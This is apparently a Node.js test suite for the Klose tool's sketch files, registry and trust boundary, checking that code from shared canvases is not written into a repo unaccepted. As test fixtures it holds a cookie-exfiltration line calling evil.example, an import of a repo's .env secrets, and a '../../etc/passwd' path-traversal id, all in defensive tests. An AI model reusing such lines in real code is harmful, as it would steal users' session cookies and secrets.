import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { webcrypto } from 'node:crypto';
import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { existsSync, rmSync } from 'node:fs';
import { spawn } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { harnessAddress, sketchFile, validateHarnessConfig } from '../server/harnessCore.js';
import { chooseSketchDir, initHarness, loadHarnessConfig, readRegistryKeys, sketchSource, syncRegistry, readAllProjects } from '../server/harness.js';
import { readSettings, sketchSetting, writeSettings } from '../server/settings.js';
import { importSpecifiers, mapRelativeImports, repoImports } from '../server/sketchImports.js';
import { shareApi, shareClient, syncShare, parseShareUrl } from '../server/shareCore.js';
import { createShareHost } from './helpers/shareHost.js';
import { readTrust } from '../server/sketchTrust.js';
import * as store from '../server/store.js';
import { createKloseServer } from '../server/http.js';

if (!globalThis.crypto?.subtle) globalThis.crypto = webcrypto;

// Sketches drawn by the repo's own bundler: with a harness in use, a sketch's
// code is also written into the repo as a file and registered, so it renders
// with real imports. These tests cover the files' lifecycle, the registry for
// both frameworks, the `sketches` setting, and the rule that only code written
// on this machine is ever written out (server/sketchTrust.js).

const here = path.dirname(fileURLToPath(import.meta.url));
const cli = path.join(here, '..', 'bin', 'klose.js');
delete process.env.KLOSE_HARNESS;
delete process.env.KLOSE_SKETCHES;
// The record of what was written on "this machine" lives under ~/.klose; the
// tests keep their own.
process.env.KLOSE_HOME = await mkdtemp(path.join(os.tmpdir(), 'klose-home-'));
process.on('exit', () => rmSync(process.env.KLOSE_HOME, { recursive: true, force: true }));

let host;
let origin;
before(async () => {
  host = createShareHost();
  origin = await host.listen();
});
after(async () => {
  await host.close();
});

async function repo(fixture = 'vite-app') {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'klose-sketches-'));
  await cp(path.join(here, 'fixtures', fixture), dir, { recursive: true });
  await initHarness(dir);
  return dir;
}
const read = (dir, rel) => readFile(path.join(dir, rel), 'utf-8');
const fileOf = (node) => `klose.sketches/${node.id}.tsx`;
const has = (dir, rel) => existsSync(path.join(dir, rel));
const sync = async (dir) => syncRegistry(dir, await readAllProjects(store, dir));

function run(cwd, args) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [cli, ...args], { cwd, env: { ...process.env, KLOSE_SHARE_HOST: origin } });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => (stdout += d));
    child.stderr.on('data', (d) => (stderr += d));
    child.on('close', (status) => resolve({ status, stdout, stderr }));
  });
}
const klose = (cwd, ...args) => run(cwd, args);

const CODE = `import { Card } from './src/Card';\nexport default function Pricing() { return <Card title="Pro" />; }`;

test('what a sketch imports: the sandbox carries react, lucide-react and recharts, and nothing of the repo', () => {
  const code = `import React, { useState } from 'react';
import { Check } from "lucide-react";
import { Button } from '@/components/ui/button';
import './src/styles.css';
export { x } from './src/x';
const lazy = () => import('./src/Lazy');
const old = require('../outside');`;
  assert.deepEqual(importSpecifiers(code), ['react', 'lucide-react', '@/components/ui/button', './src/styles.css', './src/x', './src/Lazy', '../outside']);
  assert.deepEqual(repoImports(code), ['@/components/ui/button', './src/styles.css', './src/x', './src/Lazy', '../outside']);
  assert.deepEqual(repoImports(`import { useState } from 'react'; export default () => <p className="from './nowhere'">x</p>`), ['./nowhere'], 'best effort: text that reads like an import counts');
  assert.deepEqual(repoImports(`export default function A() { return <p>hi</p>; }`), []);
  // Repo files are named from the repo root, wherever the sketch's file ends up.
  assert.equal(mapRelativeImports(`import a from './src/a'; import b from '@/b'; import c from '../c';`, (s) => `../${s.slice(2)}`), `import a from '../src/a'; import b from '@/b'; import c from '../c';`);
});

test('a sketch file: imports pointed at the repo root, React in scope, and a note on where it came from', () => {
  const node = { id: 'abc-1', name: 'Pricing\ncard', code: CODE };
  const flat = sketchSource(node, { sketchDir: 'klose.sketches' });
  assert.match(flat, /^\/\* eslint-disable \*\/\n\/\/ @ts-nocheck\n/);
  assert.match(flat, /The sketch "Pricing card" from the Klose canvas \(abc-1\)/);
  assert.match(flat, /import React from 'react';\nimport \{ Card \} from '\.\.\/src\/Card';/);
  assert.match(sketchSource(node, { sketchDir: 'src/klose.sketches' }), /from '\.\.\/\.\.\/src\/Card'/);
  assert.equal((sketchSource({ ...node, code: `import * as React from 'react';\nexport default () => null;` }, {}).match(/import .*React/g) || []).length, 1, 'no second React import');
});

test('which cards get a sketch file, and the address the canvas frames', () => {
  const config = validateHarnessConfig({ framework: 'vite', devServer: 'http://localhost:5173' }).config;
  const sketch = { id: 'n1', status: 'sketch', code: 'x' };
  assert.equal(sketchFile(config, sketch), 'klose.sketches/n1.tsx');
  assert.equal(sketchFile({ ...config, sketchDir: 'src/klose.sketches' }, sketch), 'src/klose.sketches/n1.tsx');
  assert.equal(sketchFile(config, { ...sketch, status: 'built' }), null, 'a built card renders its real file');
  assert.equal(sketchFile(config, { ...sketch, url: 'http://localhost:3000/' }), null, 'a live card renders its page');
  assert.equal(sketchFile(config, { ...sketch, code: '  ' }), null);
  assert.equal(sketchFile(config, { ...sketch, id: '../../etc/passwd' }), null, 'an id that is not a plain name never becomes a path');
  assert.equal(harnessAddress(config, sketch, ['klose.sketches/n1.tsx#default']), 'http://localhost:5173/__klose?c=klose.sketches%2Fn1.tsx#default');
  assert.equal(harnessAddress(config, sketch, []), null, 'only what the registry lists');
  assert.equal(validateHarnessConfig({ framework: 'vite', devServer: 'http://localhost:5173', sketchDir: '../out' }).error.includes('sketchDir'), true);
  assert.equal(validateHarnessConfig({ framework: 'vite', devServer: 'http://localhost:5173', sketchDir: 'src/klose.sketches' }).config.sketchDir, 'src/klose.sketches');
});

test('lifecycle: a sketch written here gets a file and a registry entry, which follow its code and go when it does', async () => {
  const dir = await repo();
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'Pricing', code: CODE });
    const text = await read(dir, fileOf(a));
    assert.match(text, /^\/\/ generated by klose, do not edit/);
    assert.match(text, /from '\.\.\/src\/Card'/);
    assert.deepEqual(await readRegistryKeys(dir), [`${fileOf(a)}#default`]);
    const registry = await read(dir, 'klose.registry.ts');
    assert.match(registry, new RegExp(`"${fileOf(a)}#default": \\(\\) => import\\("\\./${fileOf(a)}"\\)\\.then\\(\\(m\\) => pickSketch\\(m, "default"\\)\\),`));
    assert.match(registry, /function pickSketch\(/);
    assert.ok(!existsSync(path.join(dir, '.gitignore')) || !(await read(dir, '.gitignore')).includes('klose.sketches'), 'not git-ignored: Tailwind v4 would stop seeing its classes');

    // The file follows the code, and the export the card names.
    await store.updateNode(dir, p.id, a.id, { code: CODE.replace('Pro', 'Team'), exportName: 'Pricing' });
    assert.match(await read(dir, fileOf(a)), /title="Team"/);
    assert.deepEqual(await readRegistryKeys(dir), [`${fileOf(a)}#Pricing`]);

    // A whole-project save from the canvas (new card, moved card) does the same.
    const b = { id: 'canvas-made-1', name: 'B', status: 'sketch', code: 'export default () => <p>b</p>', x: 0, y: 0, width: 10, height: 10 };
    await store.updateProject(dir, p.id, { nodes: [...(await store.getProject(dir, p.id)).nodes, b] });
    assert.ok(has(dir, fileOf(b)));
    assert.equal((await readRegistryKeys(dir)).length, 2);

    // A built card renders its real file, so its sketch file goes.
    await store.updateNode(dir, p.id, a.id, { status: 'built', builtFilePath: 'src/Card.tsx', exportName: 'Card' });
    assert.ok(!has(dir, fileOf(a)));
    assert.deepEqual(await readRegistryKeys(dir), [`${fileOf(b)}#default`, 'src/Card.tsx#Card']);
    assert.match(await read(dir, 'klose.registry.ts'), /"src\/Card\.tsx#Card": \(\) => import\("\.\/src\/Card\.tsx"\)\.then\(\(m\) => m\["Card"\]\),/);

    // Losing its code, or being deleted, removes the file; the folder goes with the last one.
    await store.updateNode(dir, p.id, b.id, { code: '' });
    assert.ok(!has(dir, fileOf(b)));
    assert.ok(!has(dir, 'klose.sketches'));
    await store.updateNode(dir, p.id, b.id, { code: 'export default () => <p>back</p>' });
    assert.ok(has(dir, fileOf(b)));
    await store.updateProject(dir, p.id, { nodes: (await store.getProject(dir, p.id)).nodes.filter((n) => n.id !== b.id) });
    assert.ok(!has(dir, fileOf(b)));
    assert.deepEqual(await readRegistryKeys(dir), ['src/Card.tsx#Card']);
    assert.doesNotMatch(await read(dir, 'klose.registry.ts'), /pickSketch/);

    const c = await store.addNode(dir, p.id, { name: 'C', code: 'export default () => null' });
    assert.ok(has(dir, fileOf(c)));
    await store.deleteProject(dir, p.id);
    assert.ok(!has(dir, fileOf(c)), 'deleting the project removes its sketches');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('a sketch file a person edited is never rewritten or removed', async () => {
  const dir = await repo();
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => <p>one</p>' });
    await writeFile(path.join(dir, fileOf(a)), '// mine now\nexport default () => null;\n');
    await store.updateNode(dir, p.id, a.id, { code: 'export default () => <p>two</p>' });
    assert.equal(await read(dir, fileOf(a)), '// mine now\nexport default () => null;\n');
    const { sketches } = await sync(dir);
    assert.deepEqual(sketches.files, [{ file: fileOf(a), result: 'skipped' }]);
    await store.updateNode(dir, p.id, a.id, { code: '' });
    assert.ok(has(dir, fileOf(a)), 'left where it is');
    assert.deepEqual(await readRegistryKeys(dir), [], 'but no longer registered');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('the Expo registry requires a sketch statically, like every other component', async () => {
  const dir = await repo('expo-app');
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: `import { Text } from 'react-native';\nexport function A() { return <Text>a</Text>; }`, exportName: 'A' });
    await store.addNode(dir, p.id, { name: 'Real', status: 'built', builtFilePath: 'src/A.tsx', exportName: 'A' });
    const registry = await read(dir, 'klose.registry.ts');
    assert.match(registry, new RegExp(`"${fileOf(a)}#A": \\(\\) => pickSketch\\(require\\("\\./${fileOf(a)}"\\), "A"\\),`));
    assert.match(registry, /"src\/A\.tsx#A": \(\) => require\("\.\/src\/A\.tsx"\)\["A"\],/);
    assert.doesNotMatch(registry, /@ts-nocheck/, 'the Expo registry is type-checked with the app, so pickSketch is typed');
    assert.deepEqual(await readRegistryKeys(dir), [`${fileOf(a)}#A`, 'src/A.tsx#A']);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('the sketches setting: real by default, sandbox removes the files, KLOSE_SKETCHES wins', async () => {
  const dir = await repo();
  try {
    assert.deepEqual(await readSettings(dir), { harness: 'auto', sketches: 'real' });
    assert.deepEqual(await sketchSetting(dir, {}), { value: 'real', source: 'default' });
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => null' });
    assert.ok(has(dir, fileOf(a)));

    await writeSettings(dir, { sketches: 'sandbox' });
    assert.deepEqual(JSON.parse(await read(dir, '.klose/settings.json')), { sketches: 'sandbox' });
    assert.deepEqual(await sketchSetting(dir, {}), { value: 'sandbox', source: 'file' });
    assert.deepEqual(await sketchSetting(dir, { KLOSE_SKETCHES: 'REAL' }), { value: 'real', source: 'env' });
    await assert.rejects(writeSettings(dir, { sketches: 'sometimes' }), /real, sandbox/);
    const off = await sync(dir);
    assert.deepEqual(off.keys, []);
    assert.ok(!has(dir, fileOf(a)), 'sandbox removes what was written');
    const b = await store.addNode(dir, p.id, { name: 'B', code: 'export default () => 1' });
    assert.ok(!has(dir, fileOf(b)));

    // Back to real: what was written here is still known to have been.
    await writeSettings(dir, { sketches: 'real' });
    assert.equal((await sync(dir)).keys.length, 2, 'both come back: B was written here too, while the setting was sandbox');
    assert.ok(has(dir, fileOf(a)) && has(dir, fileOf(b)));

    // The harness being off means no sketch is drawn by the bundler either.
    await writeSettings(dir, { harness: 'off' });
    await sync(dir);
    assert.ok(!has(dir, fileOf(a)));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('the CLI and the HTTP API set the sketches setting and say which sketches are waiting', async () => {
  const dir = await repo();
  const server = createKloseServer({ cwd: dir, version: '9.9.9' });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}/api/harness`;
  const send = (method, body, to = url) => fetch(to, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => null' });
    let info = await (await fetch(url)).json();
    assert.equal(info.sketches, 'real');
    assert.deepEqual(info.registry, [`${fileOf(a)}#default`]);
    assert.deepEqual(info.pendingSketches, []);

    info = await (await send('PATCH', { sketches: 'sandbox' })).json();
    assert.equal(info.sketches, 'sandbox');
    assert.equal(info.sketchesSource, 'file');
    assert.deepEqual(info.registry, []);
    assert.ok(!has(dir, fileOf(a)));
    assert.equal((await send('PATCH', { sketches: 'sometimes' })).status, 400);
    assert.equal((await send('PATCH', {})).status, 400);

    const cliOut = await klose(dir, 'harness', 'sketches', 'real', '--json');
    assert.equal(cliOut.status, 0, cliOut.stderr);
    assert.deepEqual(JSON.parse(cliOut.stdout), { sketches: 'real', source: 'file', real: true, sketchDir: 'klose.sketches', pending: [] });
    assert.ok(has(dir, fileOf(a)));
    assert.match((await klose(dir, 'harness', 'sketches')).stdout, /^Sketches: drawn by your bundler, with real imports\. Their files are in klose\.sketches\//);
    assert.equal((await klose(dir, 'harness', 'sketches', 'maybe')).status, 1);
  } finally {
    await new Promise((r) => server.close(r));
    await rm(dir, { recursive: true, force: true });
  }
});

// ── The trust boundary ──────────────────────────────────────────────────────

test('code that arrives from somewhere else is never written into the repo, until a person accepts it', async () => {
  const dir = await repo();
  const server = createKloseServer({ cwd: dir, version: '9.9.9' });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}/api/harness`;
  try {
    const p = await store.createProject(dir, 'P');
    const mine = await store.addNode(dir, p.id, { name: 'Mine', code: 'export default () => <p>mine</p>' });
    assert.ok(has(dir, fileOf(mine)));

    // A merge from a shared canvas lands through putProject: a new sketch, and
    // new code for the one written here.
    const EVIL = `fetch('https://evil.example/' + document.cookie); export default () => null;`;
    const current = await store.getProject(dir, p.id);
    const theirs = { id: 'from-elsewhere-1', name: 'Theirs', status: 'sketch', code: EVIL, x: 0, y: 0, width: 10, height: 10 };
    await store.putProject(dir, { ...current, nodes: [{ ...current.nodes[0], code: EVIL }, theirs] });
    assert.ok(!has(dir, fileOf(mine)), 'the file of a sketch whose code was replaced from outside is removed, not rewritten');
    assert.ok(!has(dir, fileOf(theirs)));
    assert.deepEqual(await readRegistryKeys(dir), []);
    assert.deepEqual((await (await fetch(url)).json()).pendingSketches.sort(), [theirs.id, mine.id].sort());

    // The local canvas saving the project back (a card moved) changes nothing:
    // the code is the same text that came in.
    const onDisk = await store.getProject(dir, p.id);
    await store.updateProject(dir, p.id, { nodes: onDisk.nodes.map((n) => ({ ...n, x: n.x + 5 })) });
    await store.updateNode(dir, p.id, theirs.id, { name: 'Renamed', code: EVIL });
    assert.deepEqual(await readRegistryKeys(dir), []);

    // Nor does a tab that still holds the outside version saving it over a
    // local rewrite: that exact text is remembered as not written here.
    await store.updateNode(dir, p.id, mine.id, { code: 'export default () => <p>mine again</p>' });
    assert.ok(has(dir, fileOf(mine)), 'a local rewrite is local');
    await store.updateNode(dir, p.id, mine.id, { code: EVIL });
    assert.ok(!has(dir, fileOf(mine)));

    // A field on the node can't vouch for it: nothing a peer can set is read.
    await store.putProject(dir, { ...(await store.getProject(dir, p.id)), nodes: (await store.getProject(dir, p.id)).nodes.map((n) => ({ ...n, trusted: true, accepted: true })) });
    assert.deepEqual(await readRegistryKeys(dir), []);

    // A person accepts one, from the canvas.
    const accepted = await (await fetch(`${url}/accept`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ nodeId: theirs.id }) })).json();
    assert.deepEqual(accepted.registry, [`${fileOf(theirs)}#default`]);
    assert.deepEqual(accepted.pendingSketches, [mine.id]);
    assert.ok(has(dir, fileOf(theirs)));
    assert.equal((await fetch(`${url}/accept`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ nodeId: 'nope' }) })).status, 404);

    // Accepting is of the code as it was read: new code from outside waits again.
    const again = await store.getProject(dir, p.id);
    await store.putProject(dir, { ...again, nodes: again.nodes.map((n) => (n.id === theirs.id ? { ...n, code: `${EVIL}// v2` } : n)) });
    assert.ok(!has(dir, fileOf(theirs)));

    // And from the terminal.
    const listed = JSON.parse((await klose(dir, 'harness', 'accept', p.id, '--json')).stdout);
    assert.deepEqual(listed.pending.map((n) => n.id).sort(), [theirs.id, mine.id].sort());
    assert.equal((await klose(dir, 'harness', 'accept', p.id, 'nope')).status, 1);
    const all = JSON.parse((await klose(dir, 'harness', 'accept', p.id, '--all', '--json')).stdout);
    assert.deepEqual(all.accepted.sort(), [theirs.id, mine.id].sort());
    assert.equal((await readRegistryKeys(dir)).length, 2);
  } finally {
    await new Promise((r) => server.close(r));
    await rm(dir, { recursive: true, force: true });
  }
});

test('a sketch pulled in by share sync stays in the sandbox', async () => {
  const dir = await repo();
  try {
    const p = await store.createProject(dir, 'Shared');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => <p>a</p>' });
    assert.ok(has(dir, fileOf(a)));
    const shared = await klose(dir, 'share', p.id, '--json');
    assert.equal(shared.status, 0, shared.stderr);
    const link = parseShareUrl(JSON.parse(shared.stdout).url);

    // Someone with the link changes A's code and adds a sketch of their own.
    const client = shareClient(shareApi(origin));
    const theirs = await syncShare({ client, id: link.id, key: link.key, synced: null, local: null });
    const added = { id: '22222222-2222-4222-8222-222222222222', name: 'Added', status: 'sketch', code: `import secrets from './.env'; export default () => null;`, x: 0, y: 0, width: 10, height: 10, createdAt: 5, updatedAt: 5 };
    const changed = { ...theirs.project, nodes: [{ ...theirs.project.nodes[0], code: 'export default () => <p>theirs</p>', updatedAt: 5 }, added] };
    await syncShare({ client, id: link.id, key: link.key, synced: theirs.synced, local: changed });

    // Any project command pulls first.
    const pulled = await klose(dir, 'project', 'get', p.id);
    assert.equal(pulled.status, 0, pulled.stderr);
    const nodes = JSON.parse(pulled.stdout).nodes;
    assert.equal(nodes.find((n) => n.id === a.id).code, 'export default () => <p>theirs</p>');
    assert.ok(nodes.some((n) => n.id === added.id), 'the sketch itself arrives, and the sandbox can draw it');
    assert.ok(!has(dir, fileOf(added)), 'but it is not written into the repo');
    assert.ok(!has(dir, fileOf(a)), "and A's file, now out of step with its code, is gone");
    assert.deepEqual(await readRegistryKeys(dir), []);

    // The agent editing something else, with the project round-tripped, changes nothing.
    assert.equal((await klose(dir, 'project', 'update-node', p.id, added.id, JSON.stringify({ notes: 'seen', code: added.code }))).status, 0);
    assert.deepEqual(await readRegistryKeys(dir), []);
    const status = JSON.parse((await klose(dir, 'harness', 'sketches', '--json')).stdout);
    assert.deepEqual(status.pending.sort(), [a.id, added.id].sort());
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('a generated sketch file that came with the repo and matches its card counts as accepted', async () => {
  const dir = await repo();
  const clone = await repo();
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => <p>committed</p>' });
    // A teammate's checkout: the project file and the sketch file both arrive by git.
    await mkdir(path.join(clone, '.klose', 'projects'), { recursive: true });
    await mkdir(path.join(clone, 'klose.sketches'), { recursive: true });
    await cp(path.join(dir, '.klose', 'projects', `${p.id}.json`), path.join(clone, '.klose', 'projects', `${p.id}.json`));
    await cp(path.join(dir, fileOf(a)), path.join(clone, fileOf(a)));
    const first = await sync(clone);
    assert.deepEqual(first.keys, [`${fileOf(a)}#default`]);
    assert.deepEqual(first.sketches.pending, []);
    // The project file alone is not enough: change the code without the file and it waits.
    const project = await store.getProject(clone, p.id);
    await store.putProject(clone, { ...project, nodes: project.nodes.map((n) => ({ ...n, code: 'export default () => <p>changed</p>' })) });
    assert.deepEqual(await readRegistryKeys(clone), []);
    assert.ok(!has(clone, fileOf(a)));
  } finally {
    await rm(dir, { recursive: true, force: true });
    await rm(clone, { recursive: true, force: true });
  }
});

test('nothing is recorded or written in a repo without a harness', async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'klose-sketches-'));
  try {
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: 'export default () => null' });
    assert.ok(!has(dir, fileOf(a)));
    assert.ok(!has(dir, 'klose.registry.ts'));
    assert.deepEqual((await readTrust(dir)).nodes, {});
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// ── Where the files go ──────────────────────────────────────────────────────

test('sketches go where Tailwind v3 will read them, and at the repo root otherwise', async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'klose-sketches-'));
  const withConfig = async (text) => {
    await writeFile(path.join(dir, 'tailwind.config.js'), text);
    return chooseSketchDir(dir);
  };
  try {
    await mkdir(path.join(dir, 'src', 'app'), { recursive: true });
    await mkdir(path.join(dir, 'components'), { recursive: true });
    assert.equal(await chooseSketchDir(dir), 'klose.sketches', 'no Tailwind config (v4, or no Tailwind): the root');
    assert.equal(await withConfig(`module.exports = { content: ['./index.html', './src/**/*.{js,ts,jsx,tsx}'] };`), 'src/klose.sketches');
    assert.equal(await withConfig(`export default { content: ["./**/*.{ts,tsx}"] }`), 'klose.sketches', 'globs that already reach the root folder');
    assert.equal(await withConfig(`module.exports = { content: ['./src/app/**/*.tsx', './components/**/*.{ts,tsx}'] };`), 'components/klose.sketches', 'never inside a routes folder');
    assert.equal(await withConfig(`module.exports = { content: { files: ['./src/**/*.tsx'] } };`), 'src/klose.sketches');
    assert.equal(await withConfig(`module.exports = { content: ['./lib/**/*.tsx'] };`), 'klose.sketches', 'a folder that does not exist is not invented');
    assert.equal(await withConfig(`module.exports = { content: ['./src/**/*.vue'] };`), 'klose.sketches', 'globs that would not read a .tsx');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('klose harness init records a sketch folder that is not the default', async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'klose-sketches-'));
  try {
    await cp(path.join(here, 'fixtures', 'vite-app'), dir, { recursive: true });
    await writeFile(path.join(dir, 'tailwind.config.js'), `module.exports = { content: ['./src/**/*.{ts,tsx}'] };`);
    await initHarness(dir);
    assert.equal((await loadHarnessConfig(dir)).sketchDir, 'src/klose.sketches');
    const p = await store.createProject(dir, 'P');
    const a = await store.addNode(dir, p.id, { name: 'A', code: CODE });
    assert.match(await read(dir, `src/klose.sketches/${a.id}.tsx`), /from '\.\.\/\.\.\/src\/Card'/);
    assert.deepEqual(await readRegistryKeys(dir), [`src/klose.sketches/${a.id}.tsx#default`]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
